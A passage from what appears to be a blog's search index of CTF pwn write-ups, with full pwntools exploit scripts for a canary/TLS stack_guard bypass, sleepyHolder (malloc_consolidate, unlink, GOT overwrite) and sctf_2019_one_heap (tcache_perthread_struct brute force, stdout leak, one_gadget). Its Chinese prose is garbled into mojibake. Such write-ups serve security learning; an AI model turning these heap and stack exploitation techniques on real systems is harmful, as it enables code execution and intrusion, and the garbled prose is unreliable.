class="number">0x602030</span>-<span class="number">8</span>+<span class="number">0x180</span>)<span class="comment">#rbp</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])+p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(<span class="number">0x602030</span>+<span class="number">0x180</span>)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;read&#x27;</span>])+p64(leave_ret)</span><br><span class="line">payload=payload.ljust(<span class="number">0x1848</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)<span class="comment">#TLS stack_guard</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line">libc_base=recv_libc()-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base +<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(libc_base+search_og(<span class="number">1</span>)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211272253954.png" alt="image-20221127225322550"></p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://kiprey.github.io/2022/08/thread_canary/">æµ…æ Linux ç¨‹åºçš„ Canary æœºåˆ¶ | Kipreyâ€™s Blog</a></p><p><a href="https://eternalsakura13.com/2018/04/24/starctf_babystack/">thread stack bypass canaryå’Œsixstar ctf babystack writeup | Sakuraã®blog (eternalsakura13.com)</a></p><p><a href="http://liupzmin.com/2019/09/30/concurrence/tls-summary/">åˆè¯†Thread Local Storage å…”å­å…ˆç”Ÿ</a></p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
            <tag> æ ˆè¿ç§» </tag>
            
            <tag> ç¯¡æ”¹TLSä¸­stack_guard </tag>
            
            <tag> ç»•è¿‡canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sleepyHolder_hitcon_2016</title>
      <link href="/posts/b1e92899.html"/>
      <url>/posts/b1e92899.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“:"></a>æ€»ç»“:</h2><p>é€šè¿‡æœ¬é¢˜çš„å­¦ä¹ ï¼ŒçŸ¥é“äº†<strong>malloc consolidateå‡½æ•°å¯ä»¥è®©fast binçš„å †å—è¿›è¡Œåˆå¹¶ï¼Œç„¶åæ”¾åˆ°unsorted binï¼ŒåŒæ—¶å°†ä¸‹ä¸€ä¸ªå †å—çš„prev inuseä½ç½®ç©º</strong>ã€‚é€šè¿‡è¿™ä¸€ç‚¹ç»™äº†æˆ‘ä»¬åˆ©ç”¨unlinkçš„æœºä¼š,å¦‚æœåœ¨2.23ä¸‹æˆ‘ä»¬å¯ä»¥åˆ©ç”¨UAFï¼Œé‚£ä¹ˆå³ä½¿æ²¡æœ‰æº¢å‡ºï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨malloc consolidateè®©ä¸‹ä¸€ä¸ªå †å—çš„prev inuseç½®ç©ºï¼Œæœ€ååœ¨è¢«åˆå¹¶çš„å †å—é‡Œä¼ªé€ ä¸€ä¸ªfake chunkå³å¯è§¦å‘unlinkã€‚</p><h2 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥:"></a>ä¿æŠ¤ç­–ç•¥:</h2><img src="../img/image-20221103164307719.png" alt="image-20221103164307719" style="zoom:50%;" /><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ:"></a>æ¼æ´åˆ†æ:</h2><img src="../img/image-20221103164509633.png" alt="image-20221103164509633" style="zoom:50%;" /><p>å­˜åœ¨UAFæ¼æ´ï¼Œä½†æ˜¯è¿™é‡Œfreeåå»å°†ä¸€ä¸ªbssæ®µçš„å€¼ç»™ç½®ç©ºäº†ã€‚è€Œè¿™ä¸ªå€¼è¢«ç½®ç©ºå†³å®šäº†åé¢çš„showå‡½æ•°å’Œeditå‡½æ•°æ²¡æ³•å»åˆ©ç”¨UAFè¿™ä¸ªç‚¹ã€‚</p><h2 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯:"></a>åˆ©ç”¨æ€è·¯:</h2><p>è€Œè¿™é“é¢˜æœ¬èº«åªèƒ½ç”³è¯·ä¸‰ç§ä¸åŒå¤§å°çš„å †å—ï¼Œå¹¶ä¸”æ¯ç§å †å—åªèƒ½å­˜åœ¨ä¸€ä¸ªã€‚</p><p>å› ä¸ºä¸‰ç§å †å—é‡Œä¸¤ç§å †å—éƒ½æ¯”è¾ƒå¤§ï¼Œé‡Šæ”¾æ‰éƒ½èƒ½è¿›å…¥unsorted binï¼ŒåŒæ—¶æ²¡æœ‰å¼€PIEä¿æŠ¤å¹¶ä¸”å¯ä»¥ç¯¡æ”¹å‡½æ•°çš„gotè¡¨ï¼Œå› æ­¤æˆ‘ä»¬å°è¯•å¾€unlinkçš„æ–¹å‘ä¸Šè€ƒè™‘ã€‚</p><p>ä¸è¿‡unlinkçš„è¯æˆ‘ä»¬éœ€è¦æ§åˆ¶å †å—çš„prev inuseä½å’Œprev sizeä½ï¼Œprev sizeä½å¥½è¯´ï¼Œä½†æ˜¯prev inuseä½æˆ‘ä»¬é€šå¸¸é€šè¿‡æº¢å‡ºç­‰æ–¹å¼æ¥ç¯¡æ”¹ï¼Œè€Œè¿™é“é¢˜æ²¡æœ‰æº¢å‡ºä»…ä»…æ˜¯å­˜åœ¨ä¸€ä¸ªè¢«é™åˆ¶çš„UAFæ¼æ´ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬æ¥è¯´ä¸€ä¸‹å¦‚ä½•åˆ©ç”¨è¯¥UAFæ¥å®Œæˆunlinkä»¥åŠdouble freeã€‚</p><p>è¿™ä¸ªåˆ©ç”¨çš„æ ¸å¿ƒå°±æ˜¯è§¦å‘malloc_consolidateå‡½æ•°ï¼Œå°†fastbinä¸­çš„å †å—å–å‡ºæ¥è¿›è¡Œåˆå¹¶æ”¾åˆ°unsorted binä¸­ï¼ŒåŒæ—¶å°†ä¸‹ä¸€ä¸ªå †å—çš„prev inuseä½ç½®é›¶ã€‚å› æ­¤æˆ‘ä»¬åˆ©ç”¨è¿™ä¸€ç‚¹æ¥ç¯¡æ”¹å †å—çš„prev inuseä½ï¼Œè€Œç”³è¯·æœ«å°¾çš„å †å—å­—èŠ‚æ•°ä¸º8çš„è¯ï¼Œè¿™æ ·å°±å¯ä»¥æ§åˆ¶prev sizeä½äº†ï¼Œä»è€Œå®Œæˆunlinkçš„å‰æã€‚</p><p><strong>è¡¥å……:åœ¨glibc2.23ä¸­æˆ‘ä»¬ç”³è¯·å †å—æ—¶ï¼Œå½“éå†äº†fastbinåæ²¡æœ‰æ‰¾åˆ°éœ€è¦çš„å †å—ï¼Œå¹¶ä¸”éœ€è¦çš„å †å—å¤§å°è¿˜ä½äºlarge binçš„èŒƒå›´é‡Œ(ä¹Ÿå°±æ˜¯ä¸å±äºsmall binçš„èŒƒå›´)å°±ä¼šå»è°ƒç”¨malloc_consolidateå‡½æ•°æ¥æ•´ç†ä¸‹é›¶æ•£çš„å †å—ç¢ç‰‡ã€‚</strong></p><blockquote><p>å¸ƒå±€å¦‚ä¸‹:<br>add 0x28<br>add 0xFA0</p><p>delete 0   #æ­¤æ—¶å †å—è¿›å…¥fast bin</p><p>add 0x61A80  #å› ä¸ºè¯¥å †å—éå¸¸å¤§ï¼Œå…¶sizeå±äºlarge binçš„èŒƒå›´ äºæ˜¯æ­¤æ—¶è§¦å‘malloc consolidateï¼Œå°†fastbinä¸­çš„å †å—æ”¾åˆ°small binä¸­</p><p>delete 0  #2.23ä¸­çš„é’ˆå¯¹double freeçš„æ£€æµ‹æ˜¯å»åˆ¤æ–­binsé‡Œçš„ç¬¬ä¸€ä¸ªåœ°å€æ˜¯å¦ä¸ºå½“å‰é‡Šæ”¾çš„å †å—åœ°å€ï¼Œè€ŒåŸæœ¬çš„0å·å †å—å·²ç»è¿›å…¥äº†small binä¸­ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥æˆåŠŸçš„double free</p><p>add 0x28 #å°†0å·å †å—ç”³è¯·å‡ºæ¥ï¼Œå»å¾€é‡Œé¢å†™å…¥0x28çš„æ•°æ®ï¼Œæ­¤æ—¶æˆ‘ä»¬è¦†ç›–åˆ°ä¸‹ä¸€ä¸ªå †å—çš„prev sizeä½ï¼Œè€Œprev inuseä½åœ¨malloc consolidateçš„æ—¶å€™å°±è¢«ç½®ä¸ºäº†0ï¼Œä»è€Œå®Œæˆäº†unlinkå‰çš„å¸ƒå±€</p><p>delete 1#è§¦å‘unlink</p></blockquote><h2 id="è°ƒè¯•è¿‡ç¨‹"><a href="#è°ƒè¯•è¿‡ç¨‹" class="headerlink" title="è°ƒè¯•è¿‡ç¨‹:"></a>è°ƒè¯•è¿‡ç¨‹:</h2><p>ä¸Šé¢çš„è°ƒè¯•è¿‡ç¨‹å¦‚ä¸‹:</p><p><img src="/../img/image-20221103175804788.png" alt="image-20221103175804788"></p><p><img src="/../img/image-20221103180359194.png" alt="image-20221103180359194"></p><p><img src="/../img/image-20221103180532202.png" alt="image-20221103180532202"></p><p><img src="/../img/image-20221103180819622.png" alt="image-20221103180819622"></p><p><img src="/../img/image-20221103180935673.png" alt="image-20221103180935673"></p><p>ä¹‹åè§¦å‘äº†unlinkåï¼Œå°±æ˜¯ä¸€ä¸ªå¸¸è§„åŠ«æŒgotè¡¨çš„æ“ä½œï¼Œæ”¹freeå‡½æ•°çš„gotä¸ºputsçš„pltï¼Œç„¶åæ³„éœ²libcï¼Œå†æ”¹freeå‡½æ•°çš„gotä¸ºsystemåœ°å€ã€‚</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><p><a href="https://zikh26.github.io/posts/ad411136.html">tools-å‡½æ•°åº“ | ZIKH26â€™s Blog</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:28037&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params"><span class="built_in">type</span>,content</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;3. Renew secret\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;What secret do you want to keep?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">   p.sendafter(<span class="string">&#x27;Tell me your secret:&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">type</span></span>):</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;3. Renew secret\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;Which Secret do you want to wipe?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">type</span>,content</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;3. Renew secret\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;Which Secret do you want to renew?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">   p.sendafter(<span class="string">&#x27;Tell me your secret:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">debug(p,<span class="number">0x400E3C</span>,<span class="number">0x400E48</span>,<span class="number">0x400E59</span>,<span class="number">0x400BAA</span>,<span class="number">0x400C81</span>,<span class="number">0x400CB7</span>) </span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">&#x27;ssss&#x27;</span>)   </span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">ptr=<span class="number">0x6020d0</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)+p64(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])*<span class="number">2</span>+p64(e.got[<span class="string">&#x27;free&#x27;</span>]-<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">atoi_addr=recv_libc()</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr,libc)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sys_addr))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221103181450008.png" alt="image-20221103181450008"></p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¯¡æ”¹gotè¡¨ </tag>
            
            <tag> unlink </tag>
            
            <tag> malloc_consolidate </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sctf_2019_one_heap</title>
      <link href="/posts/7136f841.html"/>
      <url>/posts/7136f841.html</url>
      
        <content type="html"><![CDATA[<h2 id="å†™åœ¨å‰é¢ï¼š"><a href="#å†™åœ¨å‰é¢ï¼š" class="headerlink" title="å†™åœ¨å‰é¢ï¼š"></a>å†™åœ¨å‰é¢ï¼š</h2><p>åœ¨ä¹‹å‰åšè¿™é“é¢˜çš„æ—¶å€™<a href="https://www.cnblogs.com/ZIKH26/articles/16632897.html">SWPUCTF_2019_p1KkHeap</a>,å°±å—åˆ°äº†tcache dup+tcache poisoningæ¥çˆ†ç ´ç”³è¯·tcache_perthread_structç»“æ„ä½“çš„å¯å‘ï¼Œç»“æœåœ¨åšè¿™é“é¢˜çš„æ—¶å€™å°±é‡è§äº†è¿™ç§æ‰‹æ³•ã€‚ç”±äºè¿˜éœ€è¦æ‰“io_leakå†æ¬¡çˆ†ç ´åŠä¸ªå­—èŠ‚ï¼Œå› æ­¤è¿™ç§æ‰‹æ³•æˆåŠŸçš„æ¦‚ç‡åªæœ‰1&#x2F;256ã€‚</p><h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><p><img src="/../img/2706180-20220904232122044-1074256165.png"></p><h2 id="æ¼æ´æ‰€åœ¨-amp-amp-ç¨‹åºåˆ†æï¼š"><a href="#æ¼æ´æ‰€åœ¨-amp-amp-ç¨‹åºåˆ†æï¼š" class="headerlink" title="æ¼æ´æ‰€åœ¨&amp;&amp;ç¨‹åºåˆ†æï¼š"></a>æ¼æ´æ‰€åœ¨&amp;&amp;ç¨‹åºåˆ†æï¼š</h2><h3 id="æ¼æ´æ‰€åœ¨ï¼š"><a href="#æ¼æ´æ‰€åœ¨ï¼š" class="headerlink" title="æ¼æ´æ‰€åœ¨ï¼š"></a>æ¼æ´æ‰€åœ¨ï¼š</h3><p>å­˜åœ¨UAFæ¼æ´å¦‚ä¸‹ï¼š</p><p><img src="/../img/2706180-20220904232138391-1671777028.png"></p><h3 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h3><p>è¿™é“é¢˜åªæœ‰addå‡½æ•°å’Œdeleteå‡½æ•°ï¼Œå¹¶ä¸”é™åˆ¶äº†ä¸¤ä¸ªå‡½æ•°çš„æ‰§è¡Œæ¬¡æ•°ã€‚deleteå‡½æ•°åªèƒ½æ‰§è¡Œ4æ¬¡ï¼Œaddå‡½æ•°åªèƒ½æ‰§è¡Œ15æ¬¡ã€‚</p><p>ç„¶ådeleteå‡½æ•°çš„è¯åªèƒ½é‡Šæ”¾æœ€è¿‘ä¸€æ¬¡æ‰§è¡Œaddå‡½æ•°ç”³è¯·å‡ºæ¥å†…å­˜ç©ºé—´çš„åœ°å€ã€‚addå‡½æ•°æœ€å¤šåªèƒ½ç”³è¯·0x7få¤§å°çš„å †å—ï¼Œä¹Ÿä¸å­˜åœ¨æº¢å‡ºã€‚</p><h2 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h2><h3 id="tcache-struct-attackï¼š"><a href="#tcache-struct-attackï¼š" class="headerlink" title="tcache_struct_attackï¼š"></a>tcache_struct_attackï¼š</h3><p>å­˜åœ¨UAFæ¼æ´ï¼Œæˆ‘ä»¬æ‰“ä¸€ä¸ªtcache dupã€‚ç”±äºtcache_perthread_structç»“æ„ä½“æ˜¯å’Œåˆ†é…å‡ºæ¥çš„å †å—å­˜åœ¨å›ºå®šåç§»ï¼Œå› æ­¤tcache poisoningå»ä¿®æ”¹æœ«å°¾ä¸¤ä¸ªå­—èŠ‚å³å¯ï¼Œæ”¹ä¸ºx000(xæˆ‘ä»¬éœ€è¦çˆ†ç ´ä¸€ä¸‹ï¼Œæ¦‚ç‡ä¸º1&#x2F;16ï¼Œè°ƒè¯•çš„æ—¶å€™å…³é—­ASLRå°±ä¸ç”¨çˆ†ç ´äº†)ã€‚</p><p>å½“çˆ†ç ´æˆåŠŸæ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†tcache_perthread_structç”³è¯·å‡ºæ¥äº†ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶ä»»æ„tcacheé“¾è¡¨ä¸­çš„å¤´æŒ‡é’ˆï¼Œä»¥åŠé“¾è¡¨ä¸­å †å—çš„æ•°é‡ã€‚</p><p>æ¥ç€æˆ‘ä»¬ä¿®æ”¹0x250è¿™æ¡é“¾ä¸Šçš„countä¸º7ï¼Œæˆ‘ä»¬å°†åˆšåˆšç”³è¯·å‡ºæ¥çš„tcache_perthread_structç»™é‡Šæ”¾æ‰ï¼Œè¯¥å †å—çš„å¤§å°ä¸º0x250ï¼Œç”±äº0x250è¿™æ¡é“¾ä¸Šçš„countä¸º7äº†ï¼Œæ‰€ä»¥å†æ¬¡é‡Šæ”¾å°±è¿›å…¥äº†unsorted binä¸­ã€‚ï¼ˆå¦‚ä¸‹å›¾ï¼‰ </p><p><img src="/../img/2706180-20220904232153979-37464762.png"></p><p>ç”±äºä¸‹æ¬¡ä»è¿™ä¸ª0x250å †å—ä¸­åˆ†å‰²ä¸€å®šçš„å†…å­˜ï¼Œå°±å¯ä»¥è®©unsorted binä¸­çš„fdå’ŒbkæŒ‡é’ˆè½åœ¨æˆ‘ä»¬æƒ³è¦çš„tcacheé“¾ä¸Šã€‚æ¥ç€å†æ¬¡ç”³è¯·0x10çš„å†…å­˜ï¼Œè¿™æ ·å°±å¯ä»¥å»ç¼–è¾‘åˆšåˆšçš„fdå’ŒbkæŒ‡é’ˆäº†ï¼Œè¿™é‡Œæˆ‘ä»¬å»ç¼–è¾‘bkæŒ‡é’ˆï¼Œå°†å…¶ä¿®æ”¹ä¸ºstdoutåœ°å€(éœ€è¦çˆ†ç ´)ï¼Œç„¶åå†æ¬¡é‡Šæ”¾æ‰è¿™ä¸ª0x10çš„å †å—ï¼Œè®©å…¶è¿›å…¥fastbinä¸­ï¼Œç­‰ä¹‹åä½¿ç”¨ã€‚</p><p>ç¼–è¾‘å‰åï¼Œå¦‚ä¸‹å›¾</p><p><img src="/../img/2706180-20220904232210264-1357791408.png"></p><p>ä¸‹å›¾æ˜¯æˆ‘åšå‡ºæ¥ä¹‹åï¼Œæ‡’çš„å†å…³é—­ASLRäº†ï¼Œæ‰€ä»¥ç›´æ¥setæ”¹äº†ä¸€ä¸‹å†…å­˜å€¼ã€‚</p><p><img src="/../img/2706180-20220904232221927-1023812391.png"></p><p>ç„¶åæˆ‘ä»¬ç”³è¯·ä¸€ä¸ª0x60å¤§å°çš„å †å—ï¼Œå°±å¯ä»¥ç”³è¯·å‡ºæ¥stdoutç»“æ„ä½“äº†ï¼Œæ‰“io leakæ³„éœ²libcåœ°å€ã€‚</p><p>ç”±äºä¹‹å‰æˆ‘ä»¬é‡Šæ”¾äº†é‚£ä¸ª0x10çš„å †å—ï¼Œæ­¤æ—¶æˆ‘ä»¬å†ç”³è¯·å›æ¥(å®ƒä¸€ç›´åœ¨fastbinä¸­),è¿™æ¬¡å†™å…¥malloc_hook-8çš„åœ°å€(å› ä¸ºone_gadgetéƒ½ä¸é€šï¼Œåªèƒ½ç”¨reallocå‡½æ•°æ¥è°ƒæ•´æ ˆå¸§äº†)</p><p>å¦‚ä¸‹å›¾ï¼Œæ­¤æ—¶çš„realloc_hookå·²ç»å‡ºæ¥äº†ï¼Œåªè¦æˆ‘ä»¬ç”³è¯·0x50çš„å †å—ï¼Œå°±å¯ä»¥å»ç¼–è¾‘å®ƒäº†ã€‚</p><p><img src="/../img/2706180-20220904232259398-1658522953.png"></p><p>æœ€ç»ˆè°ƒæ•´æ ˆå¸§æ‰“one_gadgetå³å¯è·å–shellã€‚</p><p>å®Œäº‹äº†å…³é—­ASLRçˆ†ç ´æ‰“è¿œç¨‹å°±è¡Œäº†ã€‚è¯´å®è¯è¿™ä¸ªæ¦‚ç‡æ˜¯1&#x2F;256ï¼Œä½†æˆ‘çš„è„¸æ¯”è¾ƒé»‘ï¼Œå¤§å¤šæ—¶å€™è¦çˆ†ä¸ªä¸‰ç™¾æ¬¡å·¦å³æ‰å‡ºæ¥ã€‚</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><p>expé‡Œçš„tcache_struct_attackå‡½æ•°æ˜¯æˆ‘è‡ªå®šä¹‰å‡ºæ¥çš„ï¼Œå› ä¸ºæ¯æ¬¡æƒ³ä¼ªé€ tcache_structé‡Œçš„æ•°æ®ï¼Œéƒ½è¦å»æ•°ä¸€ä¸‹å¯¹åº”çš„sizeä¸­çš„å€¼ï¼Œæ„Ÿè§‰æœ‰ä¸€ç‚¹éº»çƒ¦ï¼Œå°±é¡ºä¾¿å†™äº†ä¸ªå‡½æ•°å»æŒ‡å®šsizeå†™ä¸‹å¯¹åº”countçš„å€¼ä»¥åŠåœ°å€ã€‚</p><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x98C</span></span><br><span class="line">d_a=<span class="number">0x99F</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x7f</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    delete()</span><br><span class="line">    delete()</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,0xDB5,0xD2B)</span></span><br><span class="line">    add(<span class="number">0x7f</span>,p16(<span class="number">0xc010</span>))</span><br><span class="line">    add(<span class="number">0x7f</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    payload=tcache_struct_attack(&#123;<span class="number">0x250</span>:<span class="number">7</span>,<span class="number">0x130</span>:<span class="number">1</span>&#125;)</span><br><span class="line">    add(<span class="number">0x7f</span>,payload)</span><br><span class="line">    delete()</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;abcd&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x10</span>,p64(<span class="number">0</span>)+p16(<span class="number">0x6760</span>))</span><br><span class="line">    </span><br><span class="line">    delete()</span><br><span class="line">    add(<span class="number">0x60</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3ed8b0</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_base&amp;<span class="number">0xfff</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;success!!!&quot;</span>)</span><br><span class="line">        pause()</span><br><span class="line">    malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    realloc=libc_base+libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">    one_gadget=search_og(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>,p64(malloc_hook-<span class="number">8</span>))</span><br><span class="line">    add(<span class="number">0x50</span>,p64(one_gadget+libc_base)+p64(realloc+<span class="number">8</span>))</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    log(<span class="string">&#x27;Number of blasting&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line">    p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&#x27;/home/hacker/Desktop/buu64-libc-2.27.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯çˆ†äº†355æ¬¡æ‰å‡ºæ¥â€¦.</p><p><img src="/../img/2706180-20220904232314524-847895521.png"></p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> çˆ†ç ´tcache_perthread_struct </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sctf_2019_easy_heap</title>
      <link href="/posts/afe33925.html"/>
      <url>/posts/afe33925.html</url>
      
